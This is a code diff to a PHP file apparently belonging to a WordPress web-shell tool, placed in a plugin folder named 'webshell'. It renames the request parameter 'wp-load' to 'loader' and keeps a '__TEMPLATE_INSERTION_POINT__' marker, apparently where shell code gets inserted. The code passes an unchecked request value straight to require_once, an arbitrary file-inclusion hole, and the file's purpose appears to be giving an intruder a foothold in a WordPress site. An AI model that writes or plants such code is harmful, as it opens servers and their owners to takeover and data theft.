@@ -11,11 +11,11 @@
 if (!defined('ABSPATH')) {
     define("__WP__", true);
 
-    $wp_load = $_REQUEST['wp-load'] ?: "../../../wp-load.php";
-    if (!file_exists($wp_load) && empty($_REQUEST['wp-load'])) {
+    $loader = $_REQUEST['loader'] ?: "../../../wp-load.php";
+    if (!file_exists($loader) && empty($_REQUEST['loader'])) {
         echo "<pre>";
-        echo "ALERT: wp-load.php not found. Please provide the path to the wp-load.php file using the 'wp-load' parameter.";
-        echo "Example: http://example.com/wp-content/plugins/webshell/template.php?wp-load=../../wp-load.php";
+        echo "ALERT: wp-load.php not found. Please provide the path to the wp-load.php file using the 'loader' parameter.";
+        echo "Example: http://example.com/wp-content/plugins/webshell/plugin.php?loader=../../wp-load.php";
         echo "\n\n";
         echo "Current path: " . basename(__FILE__);
         echo "</pre>";
@@ -23,7 +23,7 @@ if (!defined('ABSPATH')) {
         exit;
     }
 
-    require_once $wp_load;
+    require_once $loader;
 
     // __TEMPLATE_INSERTION_POINT__
 
